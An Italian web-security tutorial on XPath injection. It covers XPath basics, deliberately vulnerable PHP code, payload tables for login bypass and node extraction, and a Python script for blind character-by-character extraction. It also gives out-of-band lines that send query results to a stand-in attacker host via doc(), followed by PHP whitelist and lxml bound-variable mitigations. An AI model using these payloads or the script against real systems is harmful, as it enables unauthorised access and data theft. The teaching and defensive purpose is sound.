---
title: 'XPath Injection: Payload, Login Bypass e Blind Attack su XML'
slug: xpath-injection
description: 'Guida alla XPath Injection: Cos''è, Pentest, payload per login bypass, estrazione di dati XML e blind testing. Scopri tecniche, tool, segreti e mitigazioni.'
image: /xpath-injection-payload-login-bypass-blind.webp
draft: false
date: 2026-03-20T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - XPath Injection
  - XPath Injection Payloads
  - Blind XPath Injection
  - Login Bypass
  - XML Security
---

# XPath Injection: come funziona l'injection sui documenti XML

La **XPath Injection** è una vulnerabilità in cui l'applicazione prende un dato scritto dall'utente (un campo di login, un filtro di ricerca, un parametro dell'URL) e lo incolla dentro una query XPath senza controllarlo, permettendo a chi attacca di cambiare il significato della query. È lo stesso identico problema della [SQL Injection](/articoli/sql-injection/), ma il bersaglio non è un database: è un documento **XML**. Questa guida parte da zero, quindi non serve conoscere né XML né XPath: li spieghiamo prima, poi passiamo a payload, blind injection, estrazione dello schema, exfiltration out-of-band e difese.

> **Risposta rapida.** Con una XPath Injection puoi (1) saltare condizioni come login e filtri, (2) leggere nodi del documento XML che non dovevi vedere, (3) ricostruire lettera per lettera dati e struttura del documento anche quando l'app non mostra nulla (blind), e, su motori XPath 2.0+, (4) far uscire i dati verso un server tuo (OOB) o leggere altri file XML. Non c'è `--` per commentare e non c'è `UNION`: i payload si costruiscono **chiudendo bene apici e parentesi della query originale**, ed è questo il punto in cui la maggior parte dei principianti si blocca.

## Prima di tutto: cosa sono XML e XPath

Un file **XML** organizza i dati ad albero, con tag annidati uno dentro l'altro, come cartelle dentro cartelle:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<users>
  <user>
    <id>1</id>
    <username>admin</username>
    <password>s3cr3t-admin</password>
    <account>admin</account>
  </user>
  <user>
    <id>2</id>
    <username>mark</username>
    <password>m12345</password>
    <account>regular</account>
  </user>
  <user>
    <id>3</id>
    <username>fino</username>
    <password>fino2</password>
    <account>regular</account>
  </user>
</users>
```

Ogni pezzo ha un nome nel vocabolario di XPath:

* **nodo (node)**: qualsiasi elemento dell'albero. `<user>` è un nodo, `<username>` è un nodo, perfino il testo `mark` è un nodo.
* **radice (root)**: il tag più esterno, qui `<users>`.
* **figlio / padre**: `<username>` è figlio di `<user>`; `<user>` è il padre di `<username>`.
* **attributo**: un valore dentro il tag, tipo `<user role="admin">`: qui `role` è un attributo (in XPath si scrive `@role`).

**XPath** è il linguaggio per interrogare questo albero, come SQL lo è per un database. Una query XPath è un "percorso" che ti porta a uno o più nodi.

### La sintassi di base, con esempi sul documento sopra

| Espressione | Cosa seleziona                                               |
| ----------- | ------------------------------------------------------------ |
| `nodename`  | Tutti i nodi figli con quel nome                             |
| `/`         | Parte dalla radice (e separa i livelli: `/users/user`)       |
| `//`        | Cerca in qualsiasi punto dell'albero, a qualunque profondità |
| `.`         | Il nodo corrente                                             |
| `..`        | Il padre del nodo corrente                                   |
| `@`         | Seleziona un attributo                                       |
| `[ ... ]`   | Predicato: un filtro tra parentesi quadre                    |

Esempi concreti:

```xpath
/users/user                      # all <user> nodes
//username                       # every <username> in the whole document
//user[username='mark']          # the <user> whose <username> is mark
//user[username='mark']/password # only the password of that user
```

**Predicati** (il filtro tra `[ ]`) con posizione e funzioni:

```xpath
/users/user[1]                   # first user
/users/user[last()]              # last user
/users/user[last()-1]            # second-to-last user
/users/user[position()<3]        # first two users
//user[account='admin']          # users whose account is admin
```

**Wildcard**, cioè "qualsiasi cosa": `*` è un qualsiasi elemento, `@*` un qualsiasi attributo, `node()` un qualsiasi nodo di qualsiasi tipo.

```xpath
//*                              # every element in the document
/users/*                         # every direct child of <users>
//user/*                         # every child of every <user> (id, username, password, account)
//user[@*]                       # users that have at least one attribute
```

**Operatori** che userai di continuo nei payload: `or`, `and`, `=`, `!=`, `<`, `>`, `<=`, `>=`, `+`, `-`, `*`, `div`, `mod`, e `|` (l'unione di due insiemi di nodi: `//username | //password` restituisce tutti gli username **e** tutte le password).

**Funzioni** utili: `count()` (quanti nodi), `name()` (nome del tag), `string-length()` (lunghezza di un testo), `substring(testo, inizio, lunghezza)` (un pezzo di testo, la prima posizione è 1), `contains(testo, pezzo)`, `starts-with(testo, pezzo)`, `position()`, `last()`, `true()`.

> **Due cose che cambiano tutto.** (1) In XPath 1.0 **non esistono commenti** (niente `--`, niente `#`): non puoi "tagliare via" il resto della query, devi incastrarti in modo che la query resti valida fino alla fine. (2) `and` ha precedenza più alta di `or`, come la moltiplicazione sull'addizione: `A or B and C` significa `A or (B and C)`.

## Un esempio concreto, passo per passo

Immagina un sito che tiene un elenco di lavori assegnati ai dipendenti in un file XML invece che in un database (succede più spesso di quanto sembri in applicazioni datate):

```xml
<works>
  <work>
    <id>1</id>
    <employee>bob</employee>
    <password>Iamrockinginmyroom1212</password>
    <service>car</service>
  </work>
  <work>
    <id>2</id>
    <employee>alice</employee>
    <password>iamarabbitholeand7875</password>
    <service>bike</service>
  </work>
</works>
```

Una pagina filtra i lavori per servizio. "Dammi tutti i `work` il cui `service` è `car`" in XPath si scrive:

```xpath
//works/work[service='car']
```

Il codice PHP costruisce la query incollando il valore dell'utente dentro la stringa:

```php
// vulnerable: the user's value is glued directly into the query string
$query = "//works/work[service='" . $_GET['work'] . "']";
$result = $xml->xpath($query);
```

Con `?work=car` la query è `//works/work[service='car']`: tutto normale. Il problema è che PHP **non sa dove finisce "il valore" e dove inizia "la sintassi"**: sta solo incollando testo. Un apice singolo (`'`) dell'utente chiude la stringa in anticipo, e tutto quello che scrive dopo viene letto come **sintassi XPath vera**.

Chiamiamo `prefix` la parte fissa prima del tuo input (`//works/work[service='`) e `suffix` quella dopo (`']`). Il tuo payload finisce sempre tra i due: `prefix + PAYLOAD + suffix`. Per costruire un payload corretto devi sempre ricostruire questa concatenazione a mano e controllare che il risultato sia XPath valido. È l'unico modo serio di validare un payload invece di copiarlo da una lista.

## Come si scopre: il test dell'apice

```
?work='
```

Se compare un errore come questo, il parametro è vulnerabile:

```
Warning: SimpleXMLElement::xpath(): Invalid predicate in /var/www/html/portal.php on line 68
```

L'apice spezza la sintassi (`//works/work[service=''']` ha un apice di troppo) e il motore XPath non riesce più a interpretare la query. Questo è il test **error-based**. Se l'app non mostra errori, si passa al test **blind** (più sotto).

Altri test rapidi di scoperta, che non richiedono di conoscere la query:

```
'          # breaks the string: error = candidate
"          # same, if the query uses double quotes
' or '1'='1    # always-true condition: more results than normal
' and '1'='2   # always-false condition: fewer or no results
```

Dove cercare: form di login su applicazioni datate, filtri di ricerca, endpoint SOAP e XML-RPC, qualsiasi campo che restituisce un elenco di dati strutturati.

### Una precisazione importante su `'` e `&apos;`

Alcune guide dicono "se `'` non funziona prova `&apos;`". Scritta così è fuorviante, perché il tuo input attraversa **tre livelli**:

1. **Trasporto HTTP**: `&` separa i parametri nell'URL, quindi per mandare letteralmente `&apos;` in un parametro GET devi scrivere `%26apos;`.
2. **Parsing XML**: `&apos;` è un'**entità XML**, un modo standard di scrivere `'` dentro XML. Un parser XML lo trasforma in `'`.
3. **Sintassi XPath**: decide se `'` chiude una stringa.

`&apos;` diventa `'` **solo se** il tuo input passa da un parser XML prima di arrivare alla query (per esempio in un endpoint SOAP che legge il tuo input da dentro un body XML). Se invece va dritto nella stringa PHP, `&apos;` resta testo letterale. Prova prima `'`; usa `&apos;` quando l'input viaggia dentro un documento XML.

## Authentication bypass: i payload e perché funzionano

Query tipica di un login, dove username e password sono entrambi controllati dall'attaccante:

```xpath
//user[username='INPUT_USERNAME' and password='INPUT_PASSWORD']
```

Questi sono i payload di bypass classici, e **per ciascuno** il motivo per cui funziona o non funziona.

### 1. `' or '1'='1` nel solo campo username

Ricostruzione: `//user[username='' or '1'='1' and password='x']`. Per la precedenza di `and` diventa `username='' or ('1'='1' and password='x')`: la parte `'1'='1' and password='x'` è vera solo se la password è giusta. **Non basta da solo.** Funziona invece quando la query ha una sola condizione (il filtro `service` visto sopra: `//works/work[service='' or '1'='1']` restituisce tutti i `work`).

### 2. `' or '1'='1` in **entrambi** i campi

Username = `' or '1'='1`, password = `' or '1'='1`:

```xpath
//user[username='' or '1'='1' and password='' or '1'='1']
```

Con la precedenza di `and`: `username='' or ('1'='1' and password='') or '1'='1'`. L'ultimo `or '1'='1'` è sempre vero, quindi l'intera espressione è vera: restituisce **tutti** gli utenti, e di solito l'app autentica il primo (spesso l'admin).

### 3. `x' or 1=1 or 'x'='y`

Nel solo campo username:

```xpath
//user[username='x' or 1=1 or 'x'='y' and password='qualsiasi']
```

Si legge `username='x'`, **oppure** `1=1` (sempre vero), **oppure** `('x'='y' and password=...)`. Il `1=1` centrale rende vero tutto, indipendentemente dalla password. È il payload "da un solo campo" più affidabile, perché mette la condizione sempre-vera in mezzo a due `or` e la `and` finale si lega solo all'ultimo pezzo.

### 4. `' or ''='`

```xpath
//user[username='' or ''='' and password='x']
```

`''=''` è vero, ma come nel caso 1 è legato a `and password=...` da precedenza. Lo stesso payload messo in **entrambi** i campi funziona; in uno solo no. Per questo non esiste un payload universale: dipende dalla struttura.

### 5. Payload che selezionano nodi, senza una condizione

Questi sono pensati per i casi in cui la tua stringa diventa **tutto** il predicato o tutta la query:

| Payload                             | Che cosa produce                                                                |
| ----------------------------------- | ------------------------------------------------------------------------------- |
| `/`                                 | Il nodo radice del documento                                                    |
| `//`                                | Tutti i nodi discendenti                                                        |
| `//*`                               | Tutti gli elementi                                                              |
| `*/*`                               | Tutti i nipoti della radice                                                     |
| `@*`                                | Tutti gli attributi                                                             |
| `count(/child::node())`             | Il numero di figli della radice (se l'app lo mostra)                            |
| `x' or name()='username' or 'x'='y` | Vero solo sul nodo che si chiama `username`: utile per "toccare" nodi specifici |

Funzionano quando l'app concatena il tuo input fuori da un predicato (per esempio in un percorso `//user/INPUT`) o quando mostra direttamente il risultato.

## Il catalogo dei payload "Double OR"

La famiglia più utile è quella che mette **la condizione vera tra due `or`**. Il contesto di partenza è:

```xpath
//user[username='INPUT']
```

Con l'input scritto nella prima colonna, la query diventa quella della seconda. Ho controllato la sintassi di ciascuna concatenazione a mano:

| Input                               | Query risultante                                       | Effetto                                                                                         |
| ----------------------------------- | ------------------------------------------------------ | ----------------------------------------------------------------------------------------------- |
| `' or /* or '`                      | `//user[username='' or /* or '']`                      | `/*` esiste sempre, quindi vero: **tutti** gli utenti                                           |
| `' or "a" or '`                     | `//user[username='' or "a" or '']`                     | Una stringa non vuota è vera: tutti gli utenti                                                  |
| `' or 1 or '`                       | `//user[username='' or 1 or '']`                       | Un numero diverso da 0 è vero: tutti                                                            |
| `' or true() or '`                  | `//user[username='' or true() or '']`                  | `true()` è la funzione "vero": tutti                                                            |
| `'or string-length(name(.))<10 or'` | `//user[username=''or string-length(name(.))<10 or'']` | `name(.)` è `user` (4 lettere), `4<10` è vero: tutti. Il `<` va codificato come `%3C` in un URL |
| `'or contains(name,'adm') or'`      | `//user[username=''or contains(name,'adm') or'']`      | Solo se esiste un figlio `name` il cui testo contiene `adm`: dipende dallo schema               |
| `'or contains(.,'adm') or'`         | `//user[username=''or contains(.,'adm') or'']`         | Gli utenti il cui contenuto testuale contiene `adm` (`.` è il nodo stesso)                      |
| `'or position()=2 or'`              | `//user[username=''or position()=2 or'']`              | Solo il **secondo** utente                                                                      |
| `admin' or '`                       | `//user[username='admin' or '']`                       | Solo `admin` (la stringa vuota è falsa)                                                         |
| `admin' or '1'='2`                  | `//user[username='admin' or '1'='2']`                  | Ancora solo `admin`: serve a "chiudere" bene senza aggiungere nulla di vero                     |

Gli ultimi due non servono a vedere tutto: servono a **scegliere** un utente preciso mantenendo la query valida.

## Estrarre stringhe e nodi: il catalogo con parentesi e `|`

Quando la query ha **parentesi** attorno al valore, i payload precedenti non chiudono bene. Contesto di riferimento:

```xpath
//user[username=('INPUT')]
```

Qui devi chiudere una stringa **e** una parentesi. Ecco il catalogo, con la concatenazione verificata a mano:

| Input                                   | Query risultante                                             | Cosa restituisce                                                                                                                                                |
| --------------------------------------- | ------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `') or 1=1 or ('`                       | `//user[username=('') or 1=1 or ('')]`                       | Tutti gli utenti                                                                                                                                                |
| `') or 1=1] \| //user/password[('')=('` | `//user[username=('') or 1=1] \| //user/password[('')=('')]` | Gli utenti **più** tutte le password                                                                                                                            |
| `') or 2=1] \| //user/node()[('')=('`   | `//user[username=('') or 2=1] \| //user/node()[('')=('')]`   | Nessun utente (`2=1` è falso) ma **tutti i figli** di tutti gli `user` (id, username, password, account)                                                        |
| `')] \| //./node()[('')=('`             | `//user[username=('')] \| //./node()[('')=('')]`             | Tutti i nodi del documento                                                                                                                                      |
| `')] \| //node()[('')=('`               | `//user[username=('')] \| //node()[('')=('')]`               | Come sopra, più compatto                                                                                                                                        |
| `')] \| //password%00`                  | `//user[username=('')] \| //password` + byte nullo           | Tutte le password. Il `%00` (byte nullo) tronca il resto della stringa **solo su stack che trattano le stringhe come C-string**; su molti motori non ha effetto |
| `')]/../*[3][text()!=('`                | `//user[username=('')]/../*[3][text()!=('')]`                | Risale al padre (`..`), prende il suo terzo figlio e lo filtra: modo per "attraversare" l'albero                                                                |
| `')] \| //user/*[1] \| a[('`            | `//user[username=('')] \| //user/*[1] \| a[('')]`            | Il primo figlio di ogni utente, e un `a[...]` finale solo per chiudere bene                                                                                     |
| `')] \| //user/*[2] \| a[('`            | idem con `*[2]`                                              | Il secondo figlio di ogni utente (username)                                                                                                                     |
| `')] \| //user/*[3] \| a[('`            | idem con `*[3]`                                              | Il terzo figlio (password)                                                                                                                                      |
| `')] \| //user/*[4] \| a[('`            | idem con `*[4]`                                              | Il quarto figlio (account)                                                                                                                                      |

(Nel testo ho scritto `\|` per mostrarti il carattere `|` dentro la tabella: nei payload reali è un semplice `|`.)

Il trucco di fondo: il payload **chiude** il predicato (`')]`), aggiunge un `|` con una seconda espressione che seleziona i nodi che vuoi leggere, e poi **riapre** un frammento (`a[('` o `[('')=('`) in modo che la chiusura originale `')]` della query continui ad avere senso. Se la tua applicazione stampa i nodi che trova, quella seconda espressione ti fa uscire dati che il filtro doveva nascondere. Non è una `UNION` di SQL: il risultato dipende da come l'app mostra i nodi (se stampa solo il testo di `username`, i nodi `password` non compariranno comunque).

## Blind XPath Injection: quando non vedi né errori né dati

Quando l'app risponde solo in modo diverso se la condizione è vera o falsa (pagina con risultati contro pagina vuota), lavori **alla cieca**, come nella blind SQL injection booleana.

**Regola zero: la baseline.** Prima di qualsiasi estrazione, testa una condizione sicuramente vera e una sicuramente falsa, e annota esattamente come cambia la risposta (contenuto, codice HTTP, lunghezza). Con la query di login e un username inesistente:

```
' or '1'='1      # TRUE: you see the "true" response
' and '1'='2     # FALSE: you see the "false" response
```

Per le condizioni da testare usa questo schema, che sfrutta la precedenza di `and` (`A or B and C` = `A or (B and C)`):

```
' or <CONDITION> and '1'='1
```

con un username che non esiste, `username='' or (CONDITION and '1'='1')` è vera solo se `CONDITION` è vera.

### Estrarre il valore di un campo, lettera per lettera

```
' or string-length(//user[1]/password)=12 and '1'='1
' or substring(//user[1]/password,1,1)='s' and '1'='1
```

Prima trovi la **lunghezza** (provi 1, 2, 3... finché la risposta diventa "vera"), poi per ogni posizione provi i caratteri possibili. Con `//user[userid=5]/username` e `//user[userid=5]/password` puoi puntare a un utente specifico quando conosci il suo `userid`. Altre varianti del PAT:

```
and string-length(account)=SIZE_INT
and substring(account,POS,1)=SOME_CHAR
and substring(//user[userid=5]/username,2,1)=CHAR_HERE
and substring(//user[userid=5]/password,2,1)=CHAR_HERE
```

### Ricostruire lo schema da zero (nomi dei tag, struttura)

Se non conosci il documento, puoi scoprirne l'intera forma con sole domande vero/falso. Esempio sul documento `users.xml` di sopra. Ogni riga è una domanda; la risposta "vero/falso" viene dalla baseline:

```
' or count(/*)=1 and '1'='1
' or count(/*[1]/*)=3 and '1'='1
' or count(/*[1]/*[1]/*)=4 and '1'='1
' or string-length(name(/*[1]))=5 and '1'='1
' or substring(name(/*[1]),1,1)='u' and '1'='1
```

Come si legge, riga per riga:

1. `count(/*)=1`: la radice ha **1** figlio? `/*` seleziona gli elementi in cima all'albero: c'è un solo documento radice (`users`), quindi vero.
2. `count(/*[1]/*)=3`: il primo elemento (`users`) ha **3** figli? Sì, i tre `user`.
3. `count(/*[1]/*[1]/*)=4`: il primo `user` ha **4** figli? Sì: `id`, `username`, `password`, `account`.
4. `string-length(name(/*[1]))=5`: il nome del primo elemento è lungo 5 lettere? `users` ha 5 lettere, vero.
5. `substring(name(/*[1]),1,1)='u'`: la prima lettera del nome è `u`? Sì.

Ripeti per ogni posizione e ottieni il nome del tag. Poi scendi di livello (`name(/*[1]/*[1])`, `name(/*[1]/*[1]/*[2])`...) e ottieni l'albero completo, che a mano disegni così:

```
users                  <- name(/*[1])
 +- user               <- name(/*[1]/*[1])
     +- id             <- name(/*[1]/*[1]/*[1])
     +- username       <- name(/*[1]/*[1]/*[2])
     +- password       <- name(/*[1]/*[1]/*[3])
     +- account        <- name(/*[1]/*[1]/*[4])
```

Una volta che conosci lo schema, puoi estrarre i **valori** come nella sezione precedente.

### Automatizzare: uno script minimale

A mano è lento; in un test reale lo si automatizza. Questo script ricostruisce un campo con la tecnica appena vista. **Non l'ho eseguito contro un target reale** (non c'era un lab per questo articolo): adattalo alla tua baseline.

```python
import requests
import string

URL = "https://target.tld/login"      # vulnerable endpoint
TRUE_MARKER = "Welcome"                # text that appears only when the condition is true
CHARSET = string.ascii_letters + string.digits + "!@#$%^&-_."

def oracle(condition: str) -> bool:
    # username does not exist, so the result depends only on the condition
    payload = f"' or {condition} and '1'='1"
    r = requests.post(URL, data={"username": payload, "password": "x"}, timeout=10)
    return TRUE_MARKER in r.text

def get_length(xpath_expr: str, max_len: int = 64) -> int:
    for n in range(1, max_len + 1):
        if oracle(f"string-length({xpath_expr})={n}"):
            return n
    raise RuntimeError("length not found")

def get_value(xpath_expr: str) -> str:
    length = get_length(xpath_expr)
    out = ""
    for pos in range(1, length + 1):
        for ch in CHARSET:
            if oracle(f"substring({xpath_expr},{pos},1)='{ch}'"):
                out += ch
                break
    return out

print(get_value("//user[1]/password"))
```

### Tool già pronti

| Tool                                                       | Tipo       | Nota                                                                                                                                             |
| ---------------------------------------------------------- | ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| [xcat](https://github.com/orf/xcat)                        | Automatico | Il più usato per blind XPath; ti chiede una stringa che compare solo quando la condizione è vera, quindi serve comunque la baseline fatta a mano |
| [xxxpwn](https://github.com/feakk/xxxpwn) e `xxxpwn_smart` | Automatico | Estrazione blind con ottimizzazioni (la versione smart riduce il numero di richieste)                                                            |
| XmlChor                                                    | Automatico | Tool di estrazione/enumerazione per XPath injection                                                                                              |
| xpath-blind-explorer                                       | Automatico | Esplora il documento in modalità blind                                                                                                           |
| Burp Intruder                                              | Manuale    | Funziona sempre, perché controlli ogni singolo payload                                                                                           |

Se un tool dice "non vulnerabile" ma l'apice semplice ti ha già dato un errore, non fidarti: molti tool usano payload standard e non si adattano a un'app con encoding particolari. Procedi a mano con Burp.

Per allenarti, [Root Me](https://www.root-me.org/) ha challenge dedicate ("XPath injection - Authentication" e "XPath injection - Blind").

## Exploitation out-of-band (OOB) e lettura di file: attenzione alla versione di XPath

Qui c'è una distinzione che quasi nessuno spiega. Le funzioni sotto (`doc()`, `doc-available()`, `string-to-codepoints()`, `codepoints-to-string()`) **non esistono in XPath 1.0**, che è quello che usano PHP (libxml) e molti motori comuni. Sono di **XPath 2.0 e superiori**, quindi funzionano solo se il backend usa un motore come Saxon (Java, .NET con librerie XPath 2.0+...). Se il target è un'app PHP con `SimpleXMLElement`/`DOMXPath`, queste tecniche **non si applicano**: usa la blind classica.

Se il motore è 2.0+:

**Leggere un altro file XML** (`doc()` carica un documento e lo rende interrogabile):

```
doc('file://protected/secret.xml')
```

**OOB con SMB** (PAT): la query prova a raggiungere una share di rete controllata da te; se vedi la connessione sul tuo listener, hai la conferma di esecuzione:

```
?title=Foundation&type=*&rent_days=* and doc('//10.10.10.10/SHARE')
```

**OOB con HTTP, per far uscire dati** (HackTricks): concateni il dato dentro l'URL e leggi la richiesta nei log del tuo server:

```
doc(concat("http://hacker.com/oob/", RESULTS))
doc(concat("file://hacker.com/oob/", RESULTS))
doc(concat("http://hacker.com/oob/", encode-for-uri(RESULTS)))
```

Dove `RESULTS` è l'espressione XPath del dato che vuoi esfiltrare (per esempio `//user[1]/password`). `encode-for-uri()` serve quando il valore contiene caratteri non validi in un URL.

**OOB booleano con `doc-available()`**: restituisce vero/falso a seconda che il documento sia raggiungibile. Lo usi come oracolo quando non puoi vedere l'output ma puoi osservare se il tuo server riceve la richiesta:

```
doc-available(concat("http://hacker.com/oob/", RESULTS))
```

**Estrarre il nome dei nodi in OOB**, con le funzioni a codepoint (sempre XPath 2.0+): `string-to-codepoints()` converte una stringa in numeri (codice di ciascun carattere) e `codepoints-to-string()` fa il contrario. Servono a confrontare un carattere alla volta senza problemi di apici o caratteri speciali:

```
string-to-codepoints(name(/*[1]))[1] = 117      # first letter of the root tag is 'u' (117)
```

Come per ogni OOB, usalo solo su sistemi autorizzati: stai facendo uscire richieste verso un host tuo.

## XPath Injection vs SQL Injection

|                                | SQL Injection               | XPath Injection                                                 |
| ------------------------------ | --------------------------- | --------------------------------------------------------------- |
| Cosa interroghi                | Un database relazionale     | Un documento XML                                                |
| Linguaggio                     | SQL                         | XPath                                                           |
| Unire risultati extra          | `UNION SELECT`              | `\|` (con vincoli di sintassi, vedi sopra)                      |
| Commenti per troncare la query | Sì (`--`, `#`)              | No in XPath 1.0                                                 |
| Lettura di file dal server     | Con funzioni di alcuni DBMS | Non in XPath 1.0; `doc()` in 2.0+ legge altri **documenti XML** |
| Esecuzione di comandi          | Possibile su alcuni DBMS    | Non nelle funzioni standard                                     |
| Tecniche blind                 | Booleana, time-based        | Booleana (e OOB in XPath 2.0+)                                  |
| Ricostruire lo schema          | `information_schema`        | `count()` + `name()`, nessuna tabella di sistema                |

Una precisazione che manca in molte guide: dire "la XPath Injection non porta mai a nulla di più della lettura dati" **non è vero in assoluto**. XPath 1.0 non esegue comandi, ma PHP, con `DOMXPath::registerPhpFunctions()`, permette di **registrare funzioni PHP richiamabili dentro la query**. Se un'app usa questa funzione (rara, ma esiste) senza protezione, l'impatto va oltre la lettura. Verifica sempre se l'app fa qualcosa di insolito con l'XPath prima di escludere impatti maggiori.

## Mitigazioni

La soluzione in PHP e quella in Python **non sono la stessa cosa**.

### PHP: whitelist sui valori ammessi

`SimpleXMLElement::xpath()` accetta solo una stringa già pronta: non esiste un meccanismo nativo di variabili legate. La difesa è una **whitelist**: l'input sceglie una chiave in un elenco di query scritte lato server, non viene mai incollato nella query.

```php
// safe: user input only picks a key from a fixed, predefined list of full queries
$queries = [
    'car'  => "//works/work[service='car']",
    'bike' => "//works/work[service='bike']",
];

$work = $_GET['work'] ?? '';

if (!isset($queries[$work])) {
    http_response_code(400);
    exit('Invalid work');
}

$result = $xml->xpath($queries[$work]);
```

Se i valori possibili sono troppi per una whitelist (per esempio un nome utente qualsiasi), valuta se XML sia lo strumento giusto: un database con query parametrizzate è più solido.

### Python: variabili XPath con `lxml`

`lxml` ha un vero meccanismo di **variabili legate**:

```python
# safe: 'service' is bound as an XPath variable, not concatenated into the query string
result = xml.xpath("//work[service=$service]", service=user_input)
```

`$service` è un segnaposto gestito dal motore: il valore passa come dato, non come sintassi. Non confonderlo con PHP, che **non supporta** questa sintassi.

### In generale

Non usare un file XML come base per l'autenticazione: le password vanno salvate con hashing (bcrypt, Argon2), mai in chiaro come nell'esempio didattico di questa guida. Per le credenziali serve un database con query parametrizzate.

### Lato difensivo (blue team)

Monitora le eccezioni `XPathException` e gli avvisi di `SimpleXMLElement::xpath()`: una query che fallisce ripetutamente sullo stesso parametro, con pattern come `'`, `|`, `substring(`, `count(`, `string-length(`, è un segnale concreto di test in corso. Un picco di richieste quasi identiche con una sola lettera che cambia è la firma di una blind injection automatizzata.

## Come ho verificato questa guida

Le concatenazioni `prefix + payload + suffix` di ogni tabella sono state ricostruite a mano, carattere per carattere, controllando che le parentesi e gli apici tornino. I payload derivano dal catalogo di [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection) e da [HackTricks](https://book.hacktricks.wiki/en/pentesting-web/xpath-injection.html), spiegati e validati uno per uno. Non c'è un laboratorio dietro questo articolo: lo script Python e le tecniche OOB non sono stati eseguiti contro un target.

## FAQ

**Cos'è una XPath Injection?**
Una vulnerabilità in cui l'input dell'utente viene incollato senza controlli dentro una query XPath, il linguaggio per interrogare documenti XML. Chi attacca può alterare la query per saltare condizioni o leggere dati nascosti.

**Qual è la differenza tra SQL Injection e XPath Injection?**
Stesso principio (input non controllato dentro una query), ma il bersaglio è diverso: un database per SQLi, un documento XML per XPath. In XPath non ci sono commenti né `UNION`.

**Una XPath Injection può portare a RCE?**
Non con le funzioni standard di XPath 1.0. Fa eccezione il caso raro in cui l'app registra funzioni PHP con `DOMXPath::registerPhpFunctions()`: lì l'impatto va valutato caso per caso.

**Come si testa una XPath Injection?**
Inserisci un apice singolo `'` nel parametro. Se compare un errore XPath, è probabilmente vulnerabile. Se non compare nulla, confronta una condizione sicuramente vera (`' or '1'='1`) con una sicuramente falsa (`' and '1'='2`) per fare il test blind.

**Perché `' or '1'='1` a volte non fa il bypass del login?**
Perché `and` ha precedenza su `or`: se dopo il tuo input c'è `and password='...'`, la condizione sempre-vera resta legata alla password. Servono `x' or 1=1 or 'x'='y` o lo stesso payload in entrambi i campi.

**Perché a volte serve `&apos;` invece di `'`?**
Solo se l'input attraversa un parser XML prima di arrivare alla query (per esempio dentro un body SOAP). Non è una regola generale.

**`doc()` e `doc-available()` funzionano su PHP?**
No: sono XPath 2.0+, mentre PHP usa XPath 1.0 tramite libxml. Funzionano su motori come Saxon.

**Come si previene?**
In PHP con una whitelist di query predefinite complete; in Python con `lxml` e variabili XPath native (`$variabile`); in generale evitando query costruite per concatenazione e non usando file XML in chiaro per le credenziali.

## Checklist

* ☐ Apice `'` testato su tutti i parametri sospetti (e `"` se serve)
* ☐ Query ricostruita a mano: `prefix` e `suffix` capiti prima di scegliere il payload
* ☐ Baseline vero/falso definita prima di ogni test blind
* ☐ Precedenza `and`/`or` verificata sul bypass di login
* ☐ Payload con parentesi provati se la query ne contiene
* ☐ Schema ricostruito con `count()` e `name()` se non è noto
* ☐ Versione del motore XPath verificata prima di tentare `doc()` / OOB
* ☐ Nel report: distinzione tra bypass dimostrato, dati estratti e impatti solo ipotizzati

## Riferimenti tecnici

* [OWASP Web Security Testing Guide, Testing for XPath Injection](https://owasp.org/www-project-web-security-testing-guide/)
* [OWASP XPath Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XPath_Injection_Prevention_Cheat_Sheet.html)
* [PayloadsAllTheThings, XPATH Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection)
* [HackTricks, XPATH injection](https://book.hacktricks.wiki/en/pentesting-web/xpath-injection.html)
* [PHP Manual, SimpleXMLElement::xpath()](https://www.php.net/manual/en/simplexmlelement.xpath.php)
* [PHP Manual, DOMXPath::registerPhpFunctions()](https://www.php.net/manual/en/domxpath.registerphpfunctions.php)
* [PortSwigger, XPath injection](https://portswigger.net/kb/issues/00100600_xpath-injection)

Vedi anche: [SQL Injection](/articoli/sql-injection/), [XXE Injection](/articoli/xxe-injection/) (se il target usa XML anche per altri scopi), [Burp Suite](/articoli/burp-suite/) (test manuali e Intruder), [Broken Authentication](/articoli/broken-authentication/) (contesto più ampio del bypass di login).

Usa queste tecniche solo su applicazioni per cui hai un'autorizzazione scritta.
